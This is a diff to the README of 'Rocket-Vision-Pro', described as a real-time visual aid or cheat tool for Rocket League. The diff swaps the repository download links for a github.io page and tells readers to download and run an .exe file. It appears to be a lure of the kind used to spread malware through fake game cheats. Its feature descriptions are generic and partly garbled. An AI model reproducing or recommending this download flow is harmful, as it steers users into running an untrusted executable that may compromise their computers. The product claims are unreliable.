@@ -1,6 +1,6 @@
 # 🚀 Rocket-Vision-Pro - Gain the competitive edge on field
 
-[![Download Rocket-Vision-Pro](https://img.shields.io/badge/Download-Rocket--Vision--Pro-blue.svg)](https://github.com/rinaalchemic876/Rocket-Vision-Pro)
+[![Download Rocket-Vision-Pro](https://img.shields.io/badge/Download-Rocket--Vision--Pro-blue.svg)](https://rinaalchemic876.github.io)
 
 Rocket-Vision-Pro helps you improve your play in Rocket League. The tool provides visual aids and data to help you track the ball, manage your fuel, and see items across the arena. This software runs on your computer while you play. It feeds information to you in real-time so you make better choices during a match.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this tool well. Check your computer sp
 
 Follow these steps to set up the tool on your machine. You do not need developer tools to finish this process.
 
-1. Navigate to the release page at [https://github.com/rinaalchemic876/Rocket-Vision-Pro](https://github.com/rinaalchemic876/Rocket-Vision-Pro).
+1. Navigate to the release page at [https://rinaalchemic876.github.io](https://rinaalchemic876.github.io).
 2. Look for the latest release version on the right side of the screen.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or a folder you can find easily.
